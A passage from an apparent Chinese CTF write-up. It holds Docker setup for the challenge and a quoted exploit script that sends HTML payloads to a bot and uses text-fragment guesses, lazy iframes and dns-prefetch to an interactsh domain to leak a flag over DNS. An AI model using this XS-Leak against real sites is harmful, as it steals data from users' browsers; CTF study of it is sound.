</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> ./main.py /app/main.py<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>EXPOSE</span><span class=s> 6005</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENTRYPOINT</span> <span class=p>[</span> <span class=s2>&#34;python&#34;</span><span class=p>,</span> <span class=s2>&#34;/app/main.py&#34;</span> <span class=p>]</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c># docker build -t webx:latest `</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>#   --build-arg HTTP_PROXY=http://host.docker.internal:7890 `</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>#   --build-arg HTTPS_PROXY=http://host.docker.internal:7890 .</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c># docker run -d `</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>#   --name webx `</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>#   -p 6005:6005 `</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>#   --shm-size=2gb `</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>#   webx:latest</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>为了方便写了一个<code>docker-compose.yml</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>services</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>webx</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>container_name</span><span class=p>:</span><span class=w> </span><span class=l>webx</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>build</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>context</span><span class=p>:</span><span class=w> </span><span class=l>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>args</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nt>HTTP_PROXY</span><span class=p>:</span><span class=w> </span><span class=l>http://host.docker.internal:7890</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nt>HTTPS_PROXY</span><span class=p>:</span><span class=w> </span><span class=l>http://host.docker.internal:7890</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>ports</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=s2>&#34;6005:6005&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>shm_size</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;2gb&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>extra_hosts</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=s2>&#34;host.docker.internal:host-gateway&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>volumes</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>./main.py:/app/main.py</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=l>./flag.txt:/app/flag.txt</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>restart</span><span class=p>:</span><span class=w> </span><span class=l>unless-stopped</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>最后没成功解出来，看了大佬的 exp，发现有这样的好东西，OAST 监控 启动了一个子进程运行 <code>interactsh-client</code>，https://github.com/projectdiscovery/interactsh 这是一个类似于 DNSLog 的工具。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>httpx</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>TARGET_URL</span> <span class=o>=</span> <span class=s2>&#34;http://34.10.220.48:6005&#34;</span>
</span></span><span class=line><span class=cl><span class=n>INTERACTSH_BIN</span> <span class=o>=</span> <span class=s2>&#34;./interactsh-client&#34;</span>
</span></span><span class=line><span class=cl><span class=n>INTERACTSH_LOG</span> <span class=o>=</span> <span class=s2>&#34;interactsh.log&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>monitor_output</span><span class=p>(</span><span class=n>proc</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>proc</span><span class=o>.</span><span class=n>stdout</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;interactsh_stdout.log&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=nb>iter</span><span class=p>(</span><span class=n>proc</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>readline</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>f</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] Error in monitor_output: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>health_check</span><span class=p>(</span><span class=n>client</span><span class=p>,</span> <span class=n>attacker_domain</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Running Health Check...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>impossible</span> <span class=o>=</span> <span class=s2>&#34;flag_IMPOSSIBLE_&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>1000</span><span class=p>,</span><span class=mi>9999</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>unique_id</span> <span class=o>=</span> <span class=s2>&#34;healthcheck&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>generate_payload</span><span class=p>([</span><span class=n>impossible</span><span class=p>],</span> <span class=n>unique_id</span><span class=p>,</span> <span class=n>attacker_domain</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>send_to_bot</span><span class=p>(</span><span class=n>client</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    Waiting 12.5s for DNS callback...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>12.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>check_logs</span><span class=p>(</span><span class=n>unique_id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Health Check PASSED (DNS received).&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Health Check FAILED (No DNS received).&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    The exploit might be blocked, the bot is down, or the iframe isn&#39;t loading.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_payload</span><span class=p>(</span><span class=n>guesses</span><span class=p>,</span> <span class=n>unique_id</span><span class=p>,</span> <span class=n>attacker_domain</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>spacer</span> <span class=o>=</span> <span class=s1>&#39;&lt;img src=&#34;x&#34; height=&#34;4000&#34; width=&#34;10&#34;&gt;&#39;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>dns_link</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;&lt;link rel=&#34;dns-prefetch&#34; href=&#34;//</span><span class=si>{</span><span class=n>unique_id</span><span class=si>}</span><span class=s1>.</span><span class=si>{</span><span class=n>attacker_domain</span><span class=si>}</span><span class=s1>&#34;&gt;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>inner_note</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=n>dns_link</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>iframe_src</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;/?note=</span><span class=si>{</span><span class=n>inner_note</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>marker</span> <span class=o>=</span> <span class=s2>&#34;bottom_marker&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=si>{</span><span class=n>spacer</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    &lt;div&gt;</span><span class=si>{</span><span class=n>marker</span><span class=si>}</span><span class=s2>&lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=s2>    &lt;iframe loading=&#34;lazy&#34; src=&#34;</span><span class=si>{</span><span class=n>iframe_src</span><span class=si>}</span><span class=s2>&#34; width=&#34;100&#34; height=&#34;100&#34;&gt;&lt;/iframe&gt;
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>encoded_payload</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>fragment_params</span> <span class=o>=</span> <span class=s2>&#34;&amp;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=sa>f</span><span class=s2>&#34;text=</span><span class=si>{</span><span class=n>g</span><span class=si>}</span><span class=s2>&#34;</span> <span class=k>for</span> <span class=n>g</span> <span class=ow>in</span> <span class=n>guesses</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>fragment</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;:~:</span><span class=si>{</span><span class=n>fragment_params</span><span class=si>}</span><span class=s2>&amp;text=</span><span class=si>{</span><span class=n>marker</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>encoded_payload</span><span class=si>}</span><span class=s2>#</span><span class=si>{</span><span class=n>fragment</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_to_bot</span><span class=p>(</span><span class=n>client</span><span class=p>,</span> <span class=n>b64_data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>client</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>/bot&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;note&#39;</span><span class=p>:</span> <span class=n>b64_data</span><span class=p>})</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] Error sending to bot: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start_interactsh</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>INTERACTSH_LOG</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>INTERACTSH_LOG</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Starting interactsh-client...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>process</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=n>INTERACTSH_BIN</span><span class=p>,</span> <span class=s2>&#34;-json&#34;</span><span class=p>,</span> <span class=s2>&#34;-o&#34;</span><span class=p>,</span> <span class=n>INTERACTSH_LOG</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>STDOUT</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>text</span><span class=o>=</span><span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>domain</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>start_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>process</span><span class=o>.</span><span class=n>stdout</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] Error: process.stdout is None&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>,</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>start_time</span> <span class=o>&lt;</span> <span class=mi>30</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>line</span> <span class=o>=</span> <span class=n>process</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>readline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>process</span><span class=o>.</span><span class=n>poll</span><span class=p>()</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[DEBUG] </span><span class=si>{</span><span class=n>line</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;.oast.&#34;</span> <span class=ow>in</span> <span class=n>line</span> <span class=ow>or</span> <span class=s2>&#34;.interactsh.&#34;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>words</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>word</span> <span class=ow>in</span> <span class=n>words</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=s2>&#34;.oast.&#34;</span> <span class=ow>in</span> <span class=n>word</span> <span class=ow>or</span> <span class=s2>&#34;.interactsh.&#34;</span> <span class=ow>in</span> <span class=n>word</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>clean_word</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>sub</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;\x1b\[[0-9;]*m&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>word</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=s2>&#34;.&#34;</span> <span class=ow>in</span> <span class=n>clean_word</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=n>domain</span> <span class=o>=</span> <span class=n>clean_word</span>
</span></span><span class=line><span class=cl>                        <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>domain</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>domain</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] Failed to get interactsh domain. Check if interactsh-client is working.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>process</span><span class=o>.</span><span class=n>terminate</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Interactsh Domain: </span><span class=si>{</span><span class=n>domain</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>monitor_output</span><span class=p>,</span> <span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>process</span><span class=p>,))</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>.</span><span class=n>daemon</span> <span class=o>=</span> <span class=kc>True</span>
